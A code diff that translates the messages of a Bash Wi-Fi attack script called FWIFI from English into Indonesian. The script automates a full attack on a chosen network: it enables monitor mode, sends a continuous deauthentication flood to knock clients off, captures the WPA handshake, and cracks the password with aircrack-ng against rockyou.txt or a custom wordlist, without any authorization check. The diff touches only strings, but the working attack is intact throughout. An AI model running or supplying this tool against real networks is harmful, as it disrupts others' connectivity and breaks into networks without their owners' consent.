@@ -1,11 +1,11 @@
 #!/bin/bash
 # FWIFI [F*UCK WI-FI]
-# FWIFI is a Bash script designed to perform a series of penetration tests on Wi-Fi networks.
+# FWIFI adalah skrip Bash yang dirancang untuk melakukan serangkaian tes penetrasi pada jaringan Wi-Fi.
 # Github : https://github.com/rofidoang03/FWIFI
 
 clear
 if [[ $EUID -ne 0 ]]; then
-    echo "This script must be run as root."
+    echo "Skrip ini harus dijalankan sebagai root."
     exit 1
 fi
 echo ""
@@ -19,35 +19,35 @@ echo "    |      \/          \/           \/ F*CK WI-FI |    "
 echo "    |       https://github.com/rofidoang03/fwifi  |    "
 echo "    +---------------------------------------------+    "
 echo ""
-read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
+read -p "Masukkan nama antarmuka nirkabel (contoh: wlan0): " interface
 if [[ -z "$interface" ]]; then
-    echo "Interface name cannot be empty."
+    echo "Nama antarmuka nirkabel tidak boleh kosong."
     exit 1
 fi
 if ! iwconfig "$interface" >> /dev/null 2>&1; then
-    echo "Invalid interface. Please provide a valid wireless interface name."
+    echo "Antarmuka nirkabel tidak valid. Harap berikan nama antarmuka nirkabel yang valid."
     exit 1
 fi
 airmon-ng check kill ; airmon-ng start "$interface"
 airodump-ng "$interface"
 echo ""
-read -p "Enter the BSSID of the target network: " bssid
+read -p "Masukkan BSSID dari jaringan target: " bssid
 if [[ -z "$bssid" ]]; then
-    echo "BSSID cannot be empty."
+    echo "BSSID tidak boleh kosong."
     exit 1
 fi
 if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-    echo "Invalid BSSID format. Please enter a BSSID in the format XX:XX:XX:XX:XX:XX."
+    echo "Format BSSID tidak valid. Harap masukkan BSSID dalam format XX:XX:XX:XX:XX:XX."
     exit 1
 fi
 
-read -p "Enter the channel number: " channel
+read -p "Masukkan nomor Channel: " channel
 if [[ -z "$channel" ]]; then
-    echo "Channel cannot be empty."
+    echo "Channel tidak boleh kosong."
     exit 1
 fi
 if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
-    echo "Invalid channel. Please enter a valid channel number."
+    echo "Channel tidak valid. Harap masukkan nomor Channel yang valid."
     exit 1
 fi
 iwconfig "$interface" channel "$channel"
@@ -56,20 +56,20 @@ output_file="${bssid}_${timestamp}"
 xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
 file_pcap="$output_file-01.cap"
 if [ ! -f "$file_pcap" ]; then
-    echo "Capture file '$file_pcap' not found."
+    echo "File pcap '$file_pcap' tidak ditemukan."
     exit 1
 fi
 echo ""
 handshakes=$(tshark -r "$file_pcap" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
 if [[ $handshakes -gt 0 ]]; then
-    read -p "Do you want to use the default wordlist (rockyou.txt)? [Y/n] " use_default_wordlist
+    read -p "Apakah Anda ingin menggunakan wordlist default (rockyou.txt)? [Y/n] " use_default_wordlist
     if [[ $use_default_wordlist == "n" || $use_default_wordlist == "N" ]]; then
-        read -p "Enter the name of the custom wordlist: " custom_wordlist
+        read -p "Masukkan nama wordlist kustom: " custom_wordlist
         if [[ -z "$custom_wordlist" ]]; then
-            echo "Custom wordlist cannot be empty."
+            echo "Wordlist kustom tidak boleh kosong."
             exit 1
         elif [ ! -f "$custom_wordlist" ]; then
-            echo "Custom wordlist '$custom_wordlist' not found."
+            echo "Wordlist kustom '$custom_wordlist' tidak ditemukan."
             exit 1
         fi
         wordlist_option="-w $custom_wordlist"
@@ -81,6 +81,6 @@ if [[ $handshakes -gt 0 ]]; then
     exit 0
 else
     echo ""
-    echo "File '$file_pcap' does not contain enough handshakes to be cracked with aircrack-ng."
+    echo "File '$file_pcap' tidak memiliki cukup handshake untuk dapat dicrack dengan aircrack-ng."
     exit 1
 fi
